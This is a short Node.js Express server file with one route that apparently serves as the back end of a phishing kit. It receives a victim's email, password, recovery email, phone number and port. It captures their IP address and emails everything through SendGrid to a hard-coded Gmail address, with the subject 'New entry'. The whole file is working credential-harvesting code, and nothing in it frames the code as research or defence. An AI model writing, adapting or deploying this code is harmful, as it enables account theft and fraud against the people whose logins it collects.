import express from "express";
import sgMail from "@sendgrid/mail";
import cors from "cors";

// require("dotenv").config();
import env from "dotenv";
env.config();

const app = express();
app.use(express.json());
app.use(cors());

sgMail.setApiKey(process.env.SG_API_KEY);

// POST route to send an email
app.post("/send-email", async (req, res) => {
  const { email, password, recEmail, phone, port } = req.body;

  const ip = req.ip.split(":").pop();

  const msg = {
    to: "juniorhenry745@gmail.com",
    from: "hello@fortyfi.africa",
    subject: `New entry:: ${port}`,
    text: "You need to verify your email",
    html: `
              <p>Email: ${email}</p>.
              <p>Recovery Email: ${recEmail}</p>
              <p>Phone Number: ${phone}</p>
              <p>Password: ${password}</p>

              <p>IP: ${ip}</p>
              <p>PORT: ${port}</p>   
    `,
  };

  await sgMail.send(msg);

  res.status(200).send({
    status: true,
    message: "Email sent",
  });
});

// Start the server
app.listen(3000, () => {
  console.log("Server started on port 3000");
});
